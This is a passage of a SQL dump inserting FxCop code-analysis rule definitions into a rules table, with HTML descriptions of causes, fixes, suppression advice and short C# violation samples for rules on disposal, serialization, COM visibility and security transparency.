            Carefully review other messages before excluding them. This rule detects errors that are difficult to reproduce and debug.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182300.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182300.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812346, 1510817812346, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (459, 'CA2215: Dispose methods should call base class dispose', 'DisposeMethodsShouldCallBaseClassDispose', 'CA2215', 'fxcop', '<h2>Cause</h2>
<p>
            A type that implements <code>System.IDisposable</code> inherits from a type that also implements <code>IDisposable</code>. The <code>Dispose</code> method of the inheriting type does not call the <code>Dispose</code> method of the parent type.
</p>
<h2>Rule Description</h2>
<p>
            If a type inherits from a disposable type, it must call the <code>Dispose</code> method of the base type from within its own <code>Dispose</code> method. Calling the base type method Dispose ensures that any resources created by the base type are released.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call <code>base</code>.<code>Dispose</code> in your <code>Dispose</code> method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the call to <code>base</code>.<code>Dispose</code> occurs at a deeper calling level than the rule checks.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182330.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182330.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812348, 1510817812348, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (487, 'CA2133: Delegates must bind to methods with consistent transparency', 'DelegatesMustBindWithConsistentTransparency', 'CA2133', 'fxcop', '<h2>Cause</h2>
<p>
            This warning fires on a method that binds a delegate that is marked with the <code>SecurityCriticalAttribute</code> to a method that is transparent or that is marked with the <code>SecuritySafeCriticalAttribute</code>. The warning also fires a method that binds a delegate that is transparent or safe-critical to a critical method.
</p>
<h2>Rule Description</h2>
<p>
            Delegate types and the methods that they bind to must have consistent transparency. Transparent and safe-critical delegates may only bind to other transparent or safe-critical methods. Similarly, critical delegates may only bind to critical methods. These binding rules ensure that the only code that can invoke a method via a delegate could have also invoked the same method directly. For example, binding rules prevent transparent code from calling critical code directly via a transparent delegate.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this warning, change the transparency of the delegate or of the method that it binds so that the transparency of the two are equivalent.
</p>
<h2>When to Suppress Warnings</h2>

<h3>Code</h3>
<p>










            <pre>
using System;
using System.Security;

namespace TransparencyWarningsDemo
{

    public delegate void TransparentDelegate();

    [SecurityCritical]
    public delegate void CriticalDelegate();

    public class TransparentType
    {
        void DelegateBinder()
        {
            // CA2133 violation - binding a transparent delegate to a critical method
            TransparentDelegate td = new TransparentDelegate(CriticalTarget);

            // CA2133 violation - binding a critical delegate to a transparent method
            CriticalDelegate cd = new CriticalDelegate(TransparentTarget);
        }

        [SecurityCritical]
        void CriticalTarget() { }

        void TransparentTarget() { }
    }
}
</pre>





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997710.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997710.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812384, 1510817812384, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (460, 'CA1000: Do not declare static members on generic types', 'DoNotDeclareStaticMembersOnGenericTypes', 'CA1000', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible generic type contains a <code>static</code> (<code>Shared</code> in Visual Basic) member.
</p>
<h2>Rule Description</h2>
<p>
            When a <code>static</code> member of a generic type is called, the type argument must be specified for the type. When a generic instance member that does not support inference is called, the type argument must be specified for the member. The syntax for specifying the type argument in these two cases is different and easily confused, as the following calls demonstrate:









            <pre>
// Static method in a generic type.
GenericType&lt;int&gt;.StaticMethod();

// Generic instance method that does not support inference.
someObject.GenericMethod&lt;int&gt;();
</pre>




Generally, both of the prior declarations should be avoided so that the type argument does not have to be specified when the member is called. This results in a syntax for calling members in generics that is no different from the syntax for non-generics. For more information, see {rule:fxcop:GenericMethodsShouldProvideTypeParameter}.






                How to Fix Violations





</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>




                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>




                {rule:fxcop:DoNotExposeGenericLists}<br/>




                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>




                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>




                {rule:fxcop:UseGenericEventHandlerInstances}<br/>




                {rule:fxcop:UseGenericsWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182139.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182139.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812349, 1510817812350, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (461, 'CA1901: P/Invoke declarations should be portable', 'PInvokeDeclarationsShouldBePortable', 'CA1901', 'fxcop', '<h2>Cause</h2>
<p>
            This rule evaluates the size of each parameter and the return value of a P/Invoke and verifies that their size, when marshaled to unmanaged code on 32-bit and 64-bit platforms, is correct. The most common violation of this rule is to pass a fixed-sized integer where a platform-dependent, pointer-sized variable is required.
</p>
<h2>Rule Description</h2>
<p>
            Either of the following scenarios violates this rule occurs:
            <ul>
              <li>
                The return value or parameter is typed as a fixed-size integer when it should be typed as an <code>IntPtr</code>.
              </li>
              <li>
                The return value or parameter is typed as an <code>IntPtr</code> when it should be typed as a fixed-size integer.
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            You can fix this violation by using <code>IntPtr</code> or <code>UIntPtr</code> to represent handles instead of <code>Int32</code> or <code>UInt32</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You should not suppress this warning.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182284.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182284.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812351, 1510817812351, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (462, 'CA1413: Avoid non-public fields in COM visible value types', 'AvoidNonpublicFieldsInComVisibleValueTypes', 'CA1413', 'fxcop', '<h2>Cause</h2>
<p>
            A value type that is specifically marked as visible to Component Object Model (COM) declares a nonpublic instance field.
</p>
<h2>Rule Description</h2>
<p>
            Nonpublic instance fields of COM-visible value types are visible to COM clients. Review the content of the field for information that should not be exposed, or that will have an unintended design or security effect.
            By default, all public value types are visible to COM. However, to reduce false positives, this rule requires the COM visibility of the type to be explicitly stated. The containing assembly must be marked with the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> set to <code>false</code> and the type must be marked with the <code>ComVisibleAttribute</code> set to <code>true</code>.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule and keep the field hidden, change the value type to a reference type or remove the <code>ComVisibleAttribute</code> attribute from the type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if public exposure of the field is acceptable.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidStaticMembersInComVisibleTypes}<br/>




                {rule:fxcop:MarkAssembliesWithComVisible}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182196.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182196.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812352, 1510817812353, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (463, 'CA2141: Transparent methods must not satisfy LinkDemands', 'TransparentMethodsMustNotSatisfyLinkDemands', 'CA2141', 'fxcop', '<h2>Cause</h2>
<p>
            A security transparent method calls a method in an assembly that is not marked with the <code>AllowPartiallyTrustedCallersAttribute</code> (APTCA) attribute, or a security transparent method satisfies a SecurityAction<code>.LinkDemand</code> for a type or a method.
</p>
<h2>Rule Description</h2>
<p>
            Satisfying a LinkDemand is a security sensitive operation which can cause unintentional elevation of privilege. Security transparent code must not satisfy LinkDemands, because it is not subject to the same security audit requirements as security critical code. Transparent methods in security rule set level 1 assemblies will cause all LinkDemands they satisfy to be converted to full demands at run time, which can cause performance problems. In security rule set level 2 assemblies, transparent methods will fail to compile in the just-in-time (JIT) compiler if they attempt to satisfy a LinkDemand.
            In assemblies that usee Level 2 security, attempts by a security transparent method to satisfy a LinkDemand or call a method in a non-APTCA assembly raises a <code>MethodAccessException</code>; in Level 1 assemblies the LinkDemand becomes a full Demand.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, mark the accessing method with the <code>SecurityCriticalAttribute</code> or <code>SecuritySafeCriticalAttribute</code> attribute, or remove the LinkDemand from the accessed method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997445.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997445.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812353, 1510817812354, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (464, 'CA1903: Use only API from targeted framework', 'UseOnlyApiFromTargetedFramework', 'CA1903', 'fxcop', '<h2>Cause</h2>
<p>
            A member or type is using a member or type that was introduced in a service pack that was not included with the project''s targeted framework.
</p>
<h2>Rule Description</h2>
<p>
            New members and types were included in .NET Framework 2.0 Service Pack 1 and 2, .NET Framework 3.0 Service Pack 1 and 2, and .NET Framework 3.5 Service Pack 1. Projects that target the major versions of the .NET Framework can unintentionally take dependencies on these new APIs. To prevent this dependency, this rule fires on usages of any new members and types that were not included by default with the project''s target framework.

              Target Framework and Service Pack Dependencies








                    When target framework is


                    Fires on usages of members introduced in




                    .NET Framework 2.0


                    .NET Framework 2.0 SP1, .NET Framework 2.0 SP2




                    .NET Framework 3.0


                    .NET Framework 2.0 SP1, .NET Framework 2.0 SP2, .NET Framework 3.0 SP1, .NET Framework 3.0 SP2




                    .NET Framework 3.5


                    .NET Framework 3.5 SP1




                    .NET Framework 4


                    N/A




            To change a project''s target framework, see Targeting a Specific .NET Framework Version or Profile.
</p>
<h2>How to Fix Violations</h2>
<p>
            To remove the dependency on the service pack, remove all usages of the new member or type. If this is a deliberate dependency, either suppress the warning or turn this rule off.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule if this was not a deliberate dependency on the specified service pack. In this situation, your application might fail to run on systems without this service pack installed. Suppress the warning or turn this rule off if this was a deliberate dependency.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/cc667408.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/cc667408.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812355, 1510817812355, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (465, 'CA2202: Do not dispose objects multiple times', 'DoNotDisposeObjectsMultipleTimes', 'CA2202', 'fxcop', '<h2>Cause</h2>
<p>
            A method implementation contains code paths that could cause multiple calls to <code>IDisposable.Dispose</code> or a Dispose equivalent, such as a Close() method on some types, on the same object.
</p>
<h2>Rule Description</h2>
<p>
            A correctly implemented <code>Dispose</code> method can be called multiple times without throwing an exception. However, this is not guaranteed and to avoid generating a <code>System.ObjectDisposedException</code> you should not call <code>Dispose</code> more than one time on an object.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DisposeObjectsBeforeLosingScope}


</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the implementation so that regardless of the code path, <code>Dispose</code> is called only one time for the object.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Even if <code>Dispose</code> for the object is known to be safely callable multiple times, the implementation might change in the future.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182334.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182334.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812356, 1510817812356, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (466, 'CA2240: Implement ISerializable correctly', 'ImplementISerializableCorrectly', 'CA2240', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type is assignable to the <code>System.Runtime.Serialization.ISerializable</code> interface and one of the following conditions is true:
            <ul>
              <li>
                The type inherits but does not override the <code>ISerializable.GetObjectData</code> method and the type declares instance fields that are not marked with the <code>System.NonSerializedAttribute</code> attribute.
              </li>
              <li>
                The type is not sealed and the type implements a <code>GetObjectData</code> method that is not externally visible and overridable.
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            Instance fields that are declared in a type that inherits the <code>System.Runtime.Serialization.ISerializable</code> interface are not automatically included in the serialization process. To include the fields, the type must implement the <code>GetObjectData</code> method and the serialization constructor. If the fields should not be serialized, apply the <code>NonSerializedAttribute</code> attribute to the fields to explicitly indicate the decision.
            In types that are not sealed, implementations of the <code>GetObjectData</code> method should be externally visible. Therefore, the method can be called by derived types, and is overridable.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the <code>GetObjectData</code> method visible and overridable and make sure all instance fields are included in the serialization process or explicitly marked with the <code>NonSerializedAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>




                {rule:fxcop:ImplementSerializationConstructors}<br/>




                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>




                {rule:fxcop:MarkAllNonSerializableFields}<br/>




                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>




                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>




                {rule:fxcop:SecureSerializationConstructors}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182342.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182342.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812357, 1510817812358, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (467, 'CA1715: Identifiers should have correct prefix', 'IdentifiersShouldHaveCorrectPrefix', 'CA1715', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an externally visible interface does not start with an uppercase ''I''.
            -or-
            The name of a generic type parameter on an externally visible type or method does not start with an uppercase ''T''.
</p>
<h2>Rule Description</h2>
<p>
            By convention, the names of certain programming elements start with a specific prefix.
            Interface names should start with an uppercase ''I'' followed by another uppercase letter. This rule reports violations for interface names such as ''MyInterface'' and ''IsolatedInterface''.
            Generic type parameter names should start with an uppercase ''T'' and optionally may be followed by another uppercase letter. This rule reports violations for generic type parameter names such as ''V'' and ''Type''.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Rename the identifier so that it is correctly prefixed.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:IdentifiersShouldNotHaveIncorrectPrefix}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182243.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182243.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812358, 1510817812359, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (468, 'CA2237: Mark ISerializable types with SerializableAttribute', 'MarkISerializableTypesWithSerializable', 'CA2237', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type implements the <code>System.Runtime.Serialization.ISerializable</code> interface and the type is not marked with the <code>System.SerializableAttribute</code> attribute. The rule ignores derived types whose base type is not serializable.
</p>
<h2>Rule Description</h2>
<p>
            To be recognized by the common language runtime as serializable, types must be marked with the <code>SerializableAttribute</code> attribute even if the type uses a custom serialization routine through implementation of the <code>ISerializable</code> interface.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, apply the <code>SerializableAttribute</code> attribute to the type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule for exception classes because they must be serializable to work correctly across application domains.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>




                {rule:fxcop:ImplementISerializableCorrectly}<br/>




                {rule:fxcop:ImplementSerializationConstructors}<br/>




                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>




                {rule:fxcop:MarkAllNonSerializableFields}<br/>




                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>




                {rule:fxcop:SecureSerializationConstructors}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182350.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182350.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812360, 1510817812360, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (469, 'CA2103: Review imperative security', 'ReviewImperativeSecurity', 'CA2103', 'fxcop', '<h2>Cause</h2>
<p>
            A method uses imperative security and might be constructing the permission by using state information or return values that can change as long as the demand is active.
</p>
<h2>Rule Description</h2>
<p>
            Imperative security uses managed objects to specify permissions and security actions during code execution, compared to declarative security, which uses attributes to store permissions and actions in metadata. Imperative security is very flexible because you can set the state of a permission object and select security actions by using information that is not available until run time. Together with that flexibility comes the risk that the runtime information that you use to determine the state of a permission does not remain unchanged as long as the action is in effect.
            Use declarative security whenever possible. Declarative demands are easier to understand.
</p>
<h2>How to Fix Violations</h2>
<p>
            Review the imperative security demands to make sure that the state of the permission does not rely on information that can change as long as the permission is being used.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the permission does not rely on changing data. However, it is better to change the imperative demand to its declarative equivalent.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182309.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182309.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812361, 1510817812361, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (470, 'CA1017: Mark assemblies with ComVisibleAttribute', 'MarkAssembliesWithComVisible', 'CA1017', 'fxcop', '<h2>Cause</h2>
<p>
            An assembly does not have the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> attribute applied to it.
</p>
<h2>Rule Description</h2>
<p>
            The <code>ComVisibleAttribute</code> attribute determines how COM clients access managed code. Good design dictates that assemblies explicitly indicate COM visibility. COM visibility can be set for a whole assembly and then overridden for individual types and type members. If the attribute is not present, the contents of the assembly are visible to COM clients.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add the attribute to the assembly. If you do not want the assembly to be visible to COM clients, apply the attribute and set its value to <code>false</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. If you want the assembly to be visible, apply the attribute and set its value to <code>true</code>.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182157.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182157.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812362, 1510817812362, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (471, 'CA1052: Static holder types should be sealed', 'StaticHolderTypesShouldBeSealed', 'CA1052', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type contains only static members and is not declared with the <code>sealed (C# Reference)</code> (NotInheritable (Visual Basic)) modifier.
</p>
<h2>Rule Description</h2>
<p>
            This rule assumes that a type that contains only static members is not designed to be inherited, because the type does not provide any functionality that can be overridden in a derived type. A type that is not meant to be inherited should be marked with the <code>sealed</code> modifier to prohibit its use as a base type.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, mark the type as <code>sealed</code>. If you are targeting .NET Framework 2.0 or earlier, a better approach is to mark the type as <code>static</code>. In this manner, you avoid having to declare a private constructor to prevent the class from being created.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only if the type is designed to be inherited. The absence of the <code>sealed</code> modifier suggests that the type is useful as a base type.
</p>
<h2>Example of a Violation</h2>

<h3>Description</h3>
<p>
                The following example shows a type that violates the rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace DesignLibrary
{
    public class StaticMembers
    {
        static int someField;

        public static int SomeProperty
        {
            get
            {
                return someField;
            }
            set
            {
                someField = value;
            }
        }

        StaticMembers() {}

        public static void SomeMethod() {}
    }
}
</pre>





</p>
<h2>Fix with the Static Modifier</h2>

<h3>Description</h3>
<p>
                The following example shows how to fix a violation of this rule by marking the type with the <code>static</code> modifier.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace DesignLibrary
{
    public static class StaticMembers
    {
        private static int someField;

        public static int SomeProperty
        {
            get { return someField; }
            set { someField = value; }
        }

        public static void SomeMethod()
        {
        }

        public static event SomeDelegate SomeEvent;
    }

    public delegate void SomeDelegate();
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:StaticHolderTypesShouldNotHaveConstructors}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182168.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182168.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812363, 1510817812364, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (507, 'CA2221: Finalizers should be protected', 'FinalizersShouldBeProtected', 'CA2221', 'fxcop', '<h2>Cause</h2>
<p>
            A public type implements a finalizer that does not specify family (protected) access.
</p>
<h2>Rule Description</h2>
<p>
            Finalizers must use the family access modifier. This rule is enforced by the C#, Visual Basic, and Visual C++ compilers.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the finalizer to be family-accessible.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182340.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182340.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812409, 1510817812409, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (472, 'CA2112: Secured types should not expose fields', 'SecuredTypesShouldNotExposeFields', 'CA2112', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type contains public fields and is secured by a Link Demands.
</p>
<h2>Rule Description</h2>
<p>
            If code has access to an instance of a type that is secured by a link demand, the code does not have to satisfy the link demand to access the type''s fields.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the fields nonpublic and add public properties or methods that return the field data. LinkDemand security checks on types protect access to the type''s properties and methods. However, code access security does not apply to fields.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Both for security issues and for good design, you should fix violations by making the public fields nonpublic. You can suppress a warning from this rule if the field does not hold information that should remain secured, and you do not rely on the contents of the field.
</p>
<h2>Example</h2>
<p>


